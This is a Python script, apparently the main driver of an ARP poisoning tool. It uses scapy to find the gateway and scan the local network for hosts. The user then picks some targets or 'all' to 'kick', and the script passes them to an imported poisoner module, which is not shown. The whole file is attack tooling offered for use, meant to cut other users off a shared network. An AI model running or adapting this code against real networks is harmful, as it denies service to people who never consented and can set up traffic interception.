from scapy.all import *
import argparse
import re
from get_hosts import get_all_hosts
from poisoner import kick_hosts
import os

def get_defult_gateway():
    packet = IP(dst="google.com", ttl=0)
    ans = sr1(packet, verbose=False)
    return ans.src

GATEWAY = get_defult_gateway()
IFNAME = None

def main():
    parser = argparse.ArgumentParser("ARP poisener")

    parser.add_argument("--tip", help="""The IP of your target""", type=str)
    parser.add_argument("--gwy", help="""The IP of your target's gateway""", type=str)
    parser.add_argument("--iface", help="""1 if you want to see and select the interface""", type=int)

    args = parser.parse_args()

    global IFNAME

    if args.iface and args.iface==1:
        print("Available interfaces:\n")
        print(get_if_list())
        IFNAME = input("\nEnter your selected interface:\n")
        if IFNAME not in get_if_list():
            print("Invalid interface")
            exit()
    
    if args.tip:
        tip_validated = re.search(r"^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$", args.tip)
        if not bool(tip_validated):
            print("Invalid target IP!")
            exit()
        targets = [args.tip]

    else:
        if os.geteuid() != 0:
            print("You need to be root to search hosts...\nYou can run this script with the --tip parameter to set the target ip manualy ")
            exit()
        print("Serching for online hosts...\n")
        ans = get_all_hosts(IFNAME)
        if not ans or len(ans) == 0:
            print("No hosts...")
            exit()
        
        print(str(len(ans)) + " hosts found:\n")
        for i, host in enumerate(ans):
            print(str(i+1) + ": " + host[0] + " " + host[1])
        
        targets = []
        print("Which host would you like to kick? Enter their indexes (starting from 1) seperated by space. (For example: 1 3 6)\nIf you want to attack all hosts enter \"all\"")
        hosts_to_kick = input()

        if(hosts_to_kick == "all"):
            targets = [x[0] for x in ans]

        else:
            indexes = hosts_to_kick.split()

            for index in indexes:
                if not index.isdigit():
                    print("Invalid input at: "+ index)
                    exit()
                if int(index) > len(ans) or int(index) < 1:
                    print("Index out of bounds at: "+ index)
                    exit()
                try:
                    targets.append(ans[int(index)-1][0])
                except Exception:
                    print("Invalid input")
                    exit()
    
    global GATEWAY
    if args.gwy:
        gateway_validated = re.search(r"^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$", args.gwy)
        if not bool(gateway_validated):
            print("Invalid gateway IP!")
            exit()
        GATEWAY = args.gwy


    kick_hosts(targets, GATEWAY)


if __name__ == "__main__":
    main()
